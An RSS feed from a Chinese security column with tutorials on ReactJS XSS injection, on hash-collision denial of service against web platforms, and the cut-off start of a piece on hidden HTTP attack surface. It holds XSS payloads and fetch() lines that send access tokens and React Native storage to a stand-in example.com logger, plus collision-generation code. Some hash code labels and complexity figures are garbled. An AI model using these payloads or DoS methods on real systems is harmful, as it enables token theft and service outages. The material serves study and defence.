<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>二向箔安全</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>twosecurity.io</description>
<language>zh-cn</language>
<lastBuildDate>Mon, 04 Sep 2017 17:55:39 +0800</lastBuildDate>
<item>
<title>ReactJS 中的代码注入</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-08-11-28434174.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;ReactJS 中的代码注入&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28434174&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;ReactJS 概述&lt;/h2&gt;&lt;p&gt;ReactJS是一款用于构建用户界面的JavaScript库。它能预加载Web前端，给用户带来更舒适的体验。React已经实现了绝大部分的客户端逻辑（比如说React能自动编码字符串），因此开发者大抵不用担心XSS攻击。&lt;/p&gt;&lt;p&gt;因此，只要合理使用React，你的应用就不会有太大的安全隐患。然而这些防御措施还是会因为坏的编程习惯而失效，比方说：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用客户端提供的对象来创建React组件&lt;/li&gt;&lt;li&gt;通过用户提供的href或者其它可注入的属性来渲染链接&lt;/li&gt;&lt;li&gt;在React中使用dangerouslySetInnerHTML&lt;/li&gt;&lt;li&gt;把用户提供的数据传给eval()&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;就像墨非定律说的那样，这些隐患随时都会产生漏洞。让我慢慢道来。&lt;/p&gt;&lt;h2&gt;Components, Props和Elements&lt;/h2&gt;&lt;p&gt;Component(组件)是ReactJS最基本的对象。它们就像JavaScript的函数一样，接受任意输入(就是后文的props)并返回一个React Element(元素)。一个基本的component如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;class Welcome extends React.Component {
  render() {
    return &amp;lt;h1&amp;gt;Hello, {this.props.name}&amp;lt;/h1&amp;gt;;
  }
}&lt;/code&gt;&lt;p&gt;注意看奇葩的return，它返回的东西叫JSX。JSX是JavaScript语法的扩展，它会被自动转译成正常的JavaScript(ES5)代码。就拿下面的代码来说，虽然它们形式不一样，但功效相同：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// JSX代码

const element = (
  &amp;lt;h1 className=&quot;greeting&quot;&amp;gt;
  Hello, world!
  &amp;lt;/h1&amp;gt;
);

// 被转译过后的代码

const element = React.createElement(
  ‘h1’,
  {className: ‘greeting’},
  ‘Hello, world!’
);&lt;/code&gt;&lt;p&gt;在React中，开发者可以用createElement()来从component类中创建新的元素：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;React.createElement(
  type,
  [props],
  [...children]
)&lt;/code&gt;&lt;p&gt;这个函数用了这三个参数：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;type可以是HTML标签的名字(比如div,span)，或者是一个component类。不过在React Native中，这个参数只能被传入component&lt;/li&gt;&lt;li&gt;props是一个包含了许多属性的列表，并且这些值要被传给element&lt;/li&gt;&lt;li&gt;children包含了新元素的子节点&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;当你控制了其中的参数，你可以发动许多攻击&lt;/p&gt;&lt;h2&gt;注入子节点&lt;/h2&gt;&lt;p&gt;在2015年3月，Daniel LeCheminant汇报了一个&lt;a href=&quot;http://danlec.com/blog/xss-via-a-spoofed-react-element&quot;&gt;HackerOne的存储形XSS&lt;/a&gt;。导致这个问题的原因是HackerOne会将客户端提供的一个对象当作children传给React.createElement()。代码大概如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;/* 获取用户提供的参数，并将其当作JSON解析
attacker_supplied_value = JSON.parse(some_user_input)
*/
render() {  
 return &amp;lt;span&amp;gt;{attacker_supplied_value}&amp;lt;/span&amp;gt;;
}&lt;/code&gt;&lt;p&gt;JSX会被转译成这样： React.createElement(&quot;span&quot;, null, attacker_supplied_value};&lt;/p&gt;&lt;p&gt;当attacker_supplied_value是字符串时，该代码会返回一个span元素。不过在参数为简单对象时，这个函数也会正常执行。Daniel在props中添加dangerouslySetInnerHTML来阻止React转码HTML：&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
 _isReactElement: true,
 _store: {},
 type: &quot;body&quot;,
 props: {
   dangerouslySetInnerHTML: {
     __html:
     &quot;&amp;lt;h1&amp;gt;Arbitrary HTML&amp;lt;/h1&amp;gt;
     &amp;lt;script&amp;gt;alert(‘No CSP Support :(‘)&amp;lt;/script&amp;gt;
     &amp;lt;a href=’http://danlec.com&#39;&amp;gt;link&amp;lt;/a&amp;gt;&quot;
    }
  }
}&lt;/code&gt;&lt;p&gt;后来，React的元素需要有属性$$typeof: Symbol.for(&#39;react.element&#39;) 才能被正确识别。因为在注入对象时不能引用全局JavaScript Symbol，Daniel的方法也就随之失效了。&lt;/p&gt;&lt;h2&gt;控制Element类型&lt;/h2&gt;&lt;p&gt;虽然注入简单对象这个方法不能使用了，但是createElement的type参数支持字符串，因此注入component也还是有可能的。假设有以下代码：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// 用后端提供的字符串创建element
element_name = stored_value;
React.createElement(element_name, null);&lt;/code&gt;&lt;p&gt;如果stored_value被攻击者控制，那么可以通过其创建任意React component。不过这样也只能创建简单的HTML元素。为了更好地利用，攻击者必须控制新建元素时的属性参数。&lt;/p&gt;&lt;h2&gt;注入props&lt;/h2&gt;&lt;p&gt;我们来看看一下代码：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// 解析攻击者提供的JSON并传给createElement中
// 危险代码，请勿模仿
attacker_props = JSON.parse(stored_value)
React.createElement(&quot;span&quot;, attacker_props};&lt;/code&gt;&lt;p&gt;我们可以以此注入任意props参数，比方说开启dangerouslySetInnerHTML:&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{&quot;dangerouslySetInnerHTML&quot; : { &quot;__html&quot;: &quot;&amp;lt;img src=x/ onerror=’alert(localStorage.access_token)’&amp;gt;&quot;}}&lt;/code&gt;&lt;h2&gt;传统XSS&lt;/h2&gt;&lt;p&gt;一些传统的XSS攻击向量也可以被应用到ReactJS中，我将列举一些情况：&lt;/p&gt;&lt;p&gt;&lt;b&gt;设置了dangerouslySetInnerHTML&lt;/b&gt;&lt;/p&gt;&lt;p&gt;开发者可能因种种原因启用了dangerouslySetInnerHTML： &amp;lt;div dangerouslySetInnerHTML={user_supplied} /&amp;gt;&lt;/p&gt;&lt;p&gt;很显然，当你控制了它的参数后，你可以注入任意JavaScript代码&lt;/p&gt;&lt;p&gt;&lt;b&gt;可注入的属性&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果你控制了一个动态创建的a标签中的href属性，那么便可以尝试注入javascript:伪协议。还有一些HTML5的属性（formactin），也可以被用来当攻击点。&lt;/p&gt;&lt;code lang=&quot;html+handlebars&quot;&gt;&amp;lt;a href={userinput}&amp;gt;Link&amp;lt;/a&amp;gt;
&amp;lt;button form=&quot;name&quot; formaction={userinput}&amp;gt;&lt;/code&gt;&lt;p&gt;当浏览器支持HTML5的import时，如下代码也会生效： &amp;lt;link rel=”import” href={user_supplied}&amp;gt;&lt;/p&gt;&lt;h2&gt;服务端渲染的HTML&lt;/h2&gt;&lt;p&gt;为了减少页面加载的时间，人们渐渐倾向于在服务端预渲染ReactJS。在16年11月，&lt;a href=&quot;https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0&quot;&gt;Emilia Smith&lt;/a&gt;指出因为缺乏转码，&lt;a href=&quot;http://redux.js.org/&quot;&gt;Redux&lt;/a&gt;的服务端预渲染代码会导致XSS。&lt;/p&gt;&lt;p&gt;当然，只要在预渲染时缺乏转码，任何Web应用都会有类似问题。&lt;/p&gt;&lt;h2&gt;基于Eval的代码注入&lt;/h2&gt;&lt;p&gt;当你控制了一个被传入eval到执行的字符串，执行自己的代码便不在话下。不过这种情况凤毛麟角。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;function antiPattern() {
  eval(this.state.attacker_supplied);
}
// Or even crazier
fn = new Function(&quot;...&quot; + attacker_supplied + &quot;...&quot;);
fn();&lt;/code&gt;&lt;h2&gt;持久化 session&lt;/h2&gt;&lt;p&gt;对于现代Web应用而言，session cookies已经过时了。身处时代前沿的开发者一般在用无状态的session tokens，并将其存储在客户端的local storage。因此我们也要改变攻击手段了：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;fetch(&#39;http://example.com/logger.php?token=&#39;+localStorage.access_token);&lt;/code&gt;&lt;h2&gt;React Native 中的注入&lt;/h2&gt;&lt;p&gt;React Native让你可以用ReactJS在移动端编写程序，然而前文提到的手段大多在React Native中不管用：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;React Native的createInternalComponent只接受被标签过的component类。即使你能控制createElement的所有参数，也不能创建任意元素。&lt;/li&gt;&lt;li&gt;HTML属性不能使用，并且HTML不会被解析，因此一般基于浏览器的XSS(比如href)不能正常执行&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;只有基于eval的攻击才能被执行。不过当你成功地执行了JS时，就能使用React Native的API来做破坏力更强的事，比如通过AsyncStorage盗取local storage的所有数据：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;_reactNative.AsyncStorage.getAllKeys(function(err,result){_reactNative.AsyncStorage.multiGet(result,function(err,result){fetch(&#39;http://example.com/logger.php?token=&#39;+JSON.stringify(result));});});&lt;/code&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;即使React安全防御先天良好，坏的编程习惯依然会带来种种漏洞。我给大家带来两个忠告：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对于安全研究员：给每一个参数注入JavaScript或者JSON，可能会有意外的惊喜&lt;/li&gt;&lt;li&gt;对于开发者：千万不要使用eval()或dangerouslySetInnerHTML。尽可能地少解析用户提供的JSON&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;参考&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://medium.com/@muellerberndt/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1&quot;&gt;https://medium.com/@muellerberndt/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-08-11-28434174</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>高效的 Web 拒绝服务攻击</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-08-09-28424183.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;高效的 Web 拒绝服务攻击&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28424183&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文将介绍一种基于算法缺陷的，高效的 Web DoS 方法。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;前言与预备知识&lt;/h2&gt;&lt;p&gt;你是否见过这样的代码？&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;h = {} # 清空 hash 表
h[&#39;foo&#39;] = &#39;bar&#39; # 插入
print h[&#39;foo&#39;] # 查找并打印&lt;/code&gt;&lt;p&gt;你知道它是如何工作的么？&lt;br&gt;比如，h[&#39;test&#39;] = &quot;test233&quot;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;计算 hash(&#39;test&#39;)，假定值为 2（可能重复）&lt;/li&gt;&lt;li&gt;在内存区域中找到 2&lt;/li&gt;&lt;li&gt;寻找 &#39;test&#39; 得到 &quot;test233&quot;（重复的话就跟着寻找）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bca5f1aa5449c612172c04f0cdc8cbfa.png_r.jpg&quot; data-rawwidth=&quot;842&quot; data-rawheight=&quot;448&quot;&gt;具体请自行查阅实现方法，这里有一份参考资料：&lt;a href=&quot;http://liuzhijun.iteye.com/blog/2266358&quot; class=&quot;hover&quot;&gt;&lt;br&gt;http://liuzhijun.iteye.com/blog/2266358&lt;/a&gt;&lt;/p&gt;&lt;p&gt;在最佳/平均状态下的算法复杂度：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;当有 1 个元素时，增删查均为 O(1)&lt;/li&gt;&lt;li&gt;当有 n 个元素时，增删查均为 O(n)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fdee80121a3de664fb704fec78f43971.png_r.jpg&quot; data-rawwidth=&quot;842&quot; data-rawheight=&quot;231&quot;&gt;在&lt;b&gt;最糟状态下&lt;/b&gt;的算法复杂度：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;当有 n 个元素时，增删查均为 O(n^2)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2b22bac55cf1b34b11b8baef773414ed.png_r.jpg&quot; data-rawwidth=&quot;842&quot; data-rawheight=&quot;376&quot;&gt;在&lt;b&gt;现实生活中&lt;/b&gt;的最糟糕情况:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;200000 次 10 字节的碰撞产生 2 MB 流量&lt;/li&gt;&lt;li&gt;这带来 40 亿次字符串比较操作，一个 1 Ghz 的机器需要 40s&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;一般而言，我们对于 Hash 函数有以下要求：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;良好的抗碰撞特性&lt;/li&gt;&lt;li&gt;单向操作&lt;/li&gt;&lt;li&gt;固定输出长度&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;而在上面的示例中，hash 函数只有并不具备前两个特性。&lt;br&gt;h : {0,1}^* → {0,1}^n, 通常 n = 32&lt;/p&gt;&lt;h2&gt;下面是三种不同语言的hash实现方法：&lt;/h2&gt;&lt;p&gt;&lt;b&gt;DJBX33A（X:TIMES A:ADD）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;hash &amp;lt;&amp;lt; 5 + hash -&amp;gt; hash x 33&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;uint32_t hash(const char *arKey, uint32_t nKeyLength) {
  uint32_t hash = 5381;
  for (; nKeyLength &amp;gt; 0; nKeyLength -=1) {
      hash = ((hash &amp;lt;&amp;lt; 5) + hash) + *arKey++;
    }
    return hash;
}&lt;/code&gt;&lt;p&gt;&lt;b&gt;DJBX33X（X:TIMES X:XOR）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;hash &amp;lt;&amp;lt; 5 + hash -&amp;gt; hash x 33&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;uint32_t hash(const char *arKey, uint32_t nKeyLength) {
  uint32_t hash = 5381;
  for (; nKeyLength &amp;gt; 0; nKeyLength -=1) {
    hash = ((hash &amp;lt;&amp;lt; 5) + hash) ^ *arKey++;
  }
  return hash;
}&lt;/code&gt;&lt;p&gt;&lt;b&gt;java.lang.String.hashCode()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;hash &amp;lt;&amp;lt; 5 + hash -&amp;gt; hash x 33&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;uint32_t hash(const char *arKey, uint32_t nKeyLength) {
  uint32_t hash = 5381;
  for (; nKeyLength &amp;gt; 0; nKeyLength -=1) {
      hash = ((hash &amp;lt;&amp;lt; 5) + hash) + *arKey++;
  }
  return hash;
}&lt;/code&gt;&lt;p&gt;&lt;b&gt;java.lang.String.hashCode()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;hash &amp;lt;&amp;lt; 5 - hash -&amp;gt; hash x 31&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;uint32_t hash(const char *arKey, uint32_t nKeyLength) {
  uint32_t hash = 0;
  for (; nKeyLength &amp;gt; 0; nKeyLength -=1) {
    hash = ((hash &amp;lt;&amp;lt; 5) - hash) + *arKey++;
  }
  return hash;
}&lt;/code&gt;&lt;p&gt;&lt;b&gt;Equivalent substrings&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在这里，我们假设一个哈希函数为h(s) = ∑31^(n-i) · si&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;h(&#39;Ey&#39;) = 31 ^ 1 · 69 + 31^0 · 121 = 2260  
h(&#39;FZ&#39;) = 31^1 · 70 + 31^0 · 90 = 2260&lt;/code&gt;&lt;p&gt;相似的:&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;h(&#39;Eya&#39;) = 31 · (31^1 · 69 + 31^0 · 121) + 31^0 · 97  
         = 31 · (31^1 · 70 + 31^0 · 90) + 31^0 · 97  
         = h(&#39;FZa&#39;)&lt;/code&gt;&lt;p&gt;以及&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;I.    h(&#39;EzEz&#39;) (00)
II.   = h(&#39;EzFY&#39;) (01)
III.  = h(&#39;FYEz&#39;) (10)
IV.   = h(&#39;FYFY&#39;) (11)&lt;/code&gt;&lt;p&gt;和&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;h(&#39;tt&#39;) = h(&#39;uU&#39;) = h(&#39;v6&#39;)

I.    h(&#39;tttt&#39;) (00)
II.   = h(&#39;ttuU&#39;) (01)
III.  = h(&#39;ttv6&#39;) (02)
IV.   = h(&#39;uUtt&#39;) (10)
V.    = h(&#39;uUuU&#39;) (11)
VI.   = h(&#39;uUv6&#39;) (12)
VII.  = h(&#39;v6tt&#39;) (20)
VIII. = h(&#39;v6uU&#39;) (21)
IX.   = h(&#39;v6v6&#39;) (22)&lt;/code&gt;&lt;p&gt;生成 3^n 碰撞&lt;/p&gt;&lt;code lang=&quot;rb&quot;&gt;base3_strings = (0..3**n-1).each do |i|
  &quot;%0nd&quot; % i.to_s(3) # &quot;0...0&quot; to &quot;2...2&quot;
end

base3_strings.map do |s|
  s.gsub(&#39;0&#39;, &#39;tt&#39;)
  .gsub(&#39;1&#39;, &#39;uU&#39;)
  .gsub(&#39;2&#39;, &#39;v6&#39;)
end&lt;/code&gt;&lt;h2&gt;如何攻击&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;等价字符串？&lt;/li&gt;&lt;ul&gt;&lt;li&gt;不可行，因为这并不是线性的&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;暴力算法处理？&lt;/li&gt;&lt;ul&gt;&lt;li&gt;可以，但是每个字符串需要消耗一段时间&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;暴力算法开销&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;命中某一特定哈希值：2^31 次尝试&lt;/li&gt;&lt;li&gt;在两个特定哈希值中命中一个：2^30 次尝试&lt;/li&gt;&lt;li&gt;在四个特定哈希值中命中一个：2^29 次尝试&lt;/li&gt;&lt;li&gt;在 N 个特定哈希值中命中一个：2^(31-n) 次尝试&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;中途相遇攻击&lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;# 预计算: 填充查找表
repeat 2**16 times do
 s := randomsuffix # 3 char string
 h := hashback(s,target)
 precomp[h] := s
end

# 寻找预映像
loop do
 s := randomprefix # 7 字符字符串
 h := hashforth(s)
 if h in precomp then
 print s + precomp[h] # 10 字符预映像
 end
end&lt;/code&gt;&lt;p&gt;效果如下：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;x = &#39;QCMWaIO&#39;

          000cc3f7 : &#39;RMh&#39;
          000cc3f7 : &#39;Slh&#39;
          00a07ae0 : &#39;Aon&#39;
          …
          3b847a29 : &#39;Upl&#39;
h(x) -&amp;gt;   3b847a2a : &#39;vpl&#39; -&amp;gt; 0
h(x) -&amp;gt;   3b847a2a : &#39;wQl&#39; -&amp;gt; 0
          …
          99976963 : &#39;CUu&#39;
          99976964 : &#39;dUu&#39;
          99976964 : &#39;etu&#39;&lt;/code&gt;&lt;p&gt;&lt;b&gt;使用数学的运算 - XOR&lt;/b&gt;&lt;/p&gt;&lt;p&gt;A ⊕ B ⊕ B = A&lt;/p&gt;&lt;p&gt;33 · 1041204193 = 1 （假） 33 · 1041204193 ≡ 1 (mod 2^32)&lt;/p&gt;&lt;p&gt;在整数环的模 2^32 中为真，又叫做 32 位整数。&lt;br&gt;&lt;br&gt;倒退式 DJBX33X：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;uint32_t hash(char *suffix, uint32_t length, uint32_t end) {
  uint32_t hash = end;
  for (; length &amp;gt; 0; length -=1) {
    hash = (hash ^ suffix[length - 1]) * 1041204193 ;
  }
  return hash;
}&lt;/code&gt;&lt;h2&gt;开展攻击 - Web 应用中的 POST&lt;/h2&gt;&lt;p&gt;利用这个漏洞只需要 POST 数据就可以了，攻击者可以通过 XSS 获取大量攻击参与者提升 DoS 的效果。&lt;/p&gt;&lt;p&gt;&lt;b&gt;PHP&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;PHP 5: DJBX33A, 32 bit → 等价字符串&lt;/li&gt;&lt;li&gt;PHP 4: DJBX33X, 32 and 64 bit → 中途相遇攻击&lt;/li&gt;&lt;li&gt;默认 POST 最大值: 8 MB&lt;/li&gt;&lt;li&gt;默认最大输入时间: -1 (无限制/最大执行时间)&lt;/li&gt;&lt;li&gt;大部分发行版: 60 秒&lt;/li&gt;&lt;li&gt;理论值: 8 MB POST → 288 分钟 CPU 时间&lt;/li&gt;&lt;li&gt;现实: 500k POST → 1 分钟 CPU 时间或 300k → 30 秒 CPU 时间&lt;/li&gt;&lt;li&gt;现实效率&lt;/li&gt;&lt;ul&gt;&lt;li&gt;在大约 70-100 Kbps 可以保持一个 Core i7 处理核心繁忙&lt;/li&gt;&lt;li&gt;在大约 1 Gbps 可以保持 10 个 Core i7 处理核心繁忙&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php echo $_POST[&quot;param&quot;]; ?&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;b&gt;Java&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;String.hashCode() 与 DJBX33A 非常相似 → 等价字符串&lt;/li&gt;&lt;li&gt;可作为替代的，中途相遇攻击可用于哈希值已被缓存的更多碰撞，只有哈希不为 0 可用&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;所有被测试的服务器均使用 HashTable 或 HashMap 存储 POST 数据&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Apache Tomcat&lt;/li&gt;&lt;li&gt;Apache Geronimo&lt;/li&gt;&lt;li&gt;Jetty&lt;/li&gt;&lt;li&gt;Oracle Glassfish&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Tomcat: 2 MB → 44 分钟 CPU 时间&lt;/p&gt;&lt;ul&gt;&lt;li&gt;大约 6 Kbps 可以保持一个 Core i7 核心繁忙&lt;/li&gt;&lt;li&gt;大约 1 Gbps 可以保持 100000 个 Core i7 核心繁忙&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;java&quot;&gt;public void doPost(HttpServletRequest request,
HttpServletResponse response)
 throws ServletException, IOException {
 out.println(request.getParameter(&#39;param&#39;));
}&lt;/code&gt;&lt;p&gt;&lt;b&gt;ASP .NET&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Request.Form 是一个 NameValueCollection 对象&lt;/p&gt;&lt;ul&gt;&lt;li&gt;DJBX33X → 中途相遇攻击&lt;/li&gt;&lt;li&gt;4 MB → 650 分钟 CPU 时间&lt;/li&gt;&lt;li&gt;IIS 理论上限制 90 秒&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;现实效率&lt;/p&gt;&lt;ul&gt;&lt;li&gt;大约 30 Kbps 可以保持一个 Core 2 核心繁忙&lt;/li&gt;&lt;li&gt;大约 1 Gbps 可以保持 30000 个 Core 2 核心繁忙&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;vb.net&quot;&gt;Response.Write Request.Form[&#39;param&#39;]&lt;/code&gt;&lt;p&gt;&lt;b&gt;Python&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Python 的哈希函数与 DJBX33X 非常类似，&lt;br&gt;与 register-size 有关联，根据 32 位、64 位有不同。 无法使用中间相遇攻击。&lt;br&gt;合理大小攻击字符串仅对 32 位有作用。&lt;br&gt;最大支持 POST 大小为 1 MB，需要消耗 7 分钟的 CPU 时间。&lt;/p&gt;&lt;p&gt;现实效率&lt;/p&gt;&lt;ul&gt;&lt;li&gt;大约 20 Kbps 可以保持一个 Core Duo 核心繁忙&lt;/li&gt;&lt;li&gt;大约 1 Gbps 可以保持 50000 个 Core Duo 核心繁忙&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;v8/Node.js&lt;/b&gt;&lt;/p&gt;&lt;p&gt;与其他的语言不同，但是中途相遇攻击依然可用。&lt;br&gt;Node.js 使用 querystring 去解析 POST 数据到哈希表中。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;while (len--) {
  hash += *p++;
  hash += (hash &amp;lt;&amp;lt; 10);
  hash ^= (hash &amp;gt;&amp;gt; 6);
}&lt;/code&gt;&lt;p&gt;当然，目前版本也已经修复：&lt;a href=&quot;https://nodejs.org/en/blog/vulnerability/july-2017-security-releases/#node-js-specific-security-flaws&quot;&gt;Security updates for all active release lines, July 2017 | Node.js&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;修复方法&lt;/h2&gt;&lt;p&gt;使用随机的哈希函数，在 CRuby 1.9 和 Perl 已经使用了。&lt;/p&gt;&lt;p&gt;临时措施：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;减少 POST 最大值：几乎被所有语言支持（可能 Node 除外）&lt;/li&gt;&lt;li&gt;减少 POST 参数最大值&lt;/li&gt;&lt;li&gt;CPU 限制&lt;/li&gt;&lt;ul&gt;&lt;li&gt;PHP: 降低 max_input_time&lt;/li&gt;&lt;li&gt;IIS 环境的 ASP.NET: 设置进程时间限制&lt;/li&gt;&lt;li&gt;Java Web 服务器通常不可用&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h2&gt;结束&lt;/h2&gt;&lt;p&gt;还有哪些东西是被哈希表处理的呢？JSON, YAML, … (AJAX) 我们需要思考攻击者是否控制了哈希表中的数据的结束，要使用不同的数据结构，比如 treemaps 等，尝试通过哈希短字符串或空字符串来确认自己使用的哈希函数。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;参考：&lt;a href=&quot;https://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf&quot;&gt;https://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;</description>
<author>TwoSecurity</author>
<guid isPermaLink="false">2017-08-09-28424183</guid>
<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>HTTP 中的隐藏攻击面</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-08-04-28306016.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;HTTP 中的隐藏攻击面&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28306016&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;前言：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们访问互联网的时候除了常见的 Web 层之外，通常还会经过许多隐藏的服务系统，他们会对一些数据进行分析以及其它一些处理。然而这一层几乎不可见的攻击层却被许多人忽略了。&lt;/p&gt;&lt;p&gt;在这篇文章中，我会展示如何伪造请求头来使这些系统暴露，并且为让它们为我们打开一道攻击内网的大门。我通过组合一些技巧以及 Bash 命令来打入 DoD 网络。通过这些漏洞我获取了三万美金的奖励，并且意外地攻破了自己的 ISP。&lt;/p&gt;&lt;p&gt;在分析攻击时，我将展示几个发现的「隐藏系统」。除了探索一个截取信息的英国 ISP，还将讨论一个来自哥伦比亚的可疑 ISP，一个令人困惑的 Tor 后端，以及一个可以让反射型 XSS 升级为 SSRF 的系统。最后，我会利用一个用于网络流量追踪的 BurpSuite 插件来探索这些系统。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;简介：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;无论是 Shellsock，StageFright，或者 Image Tragick，发现一个重大漏洞意味着相同问题的存在。导致该现象发生的一个原因是一些攻击面会被安全研究员忽略。在这个论文中，我会展示从反向代理，负载均衡，后台分析系统派生出的攻击面。我将描述一个简单有效的审计该类系统的方法，然后展示一部分我找到的高危漏洞。&lt;/p&gt;&lt;p&gt;同样地，我也会开放两个工具。一个是 Collaborator Everything ，一款可以检测隐藏的后台系统的 Burp 插件。你可以通过 BApp store 或者 Github 上的源码（ &lt;a href=&quot;https://github.com/PortSwigger/collaborator-everywhere&quot;&gt;PortSwigger/collaborator-everywhere&lt;/a&gt; ）来安装它。Rendering Engine Hackability Probe 是一个分析连接过来的客户端的攻击面，可以在 &lt;a href=&quot;https://github.com/PortSwigger/hackability&quot;&gt;PortSwigger/hackability&lt;/a&gt; 处下载或者在 &lt;a href=&quot;http://portswigger-labs.net/hackability/&quot;&gt;Rendering Engine Hackability Probe&lt;/a&gt; 直接使用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击手段：&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;监听 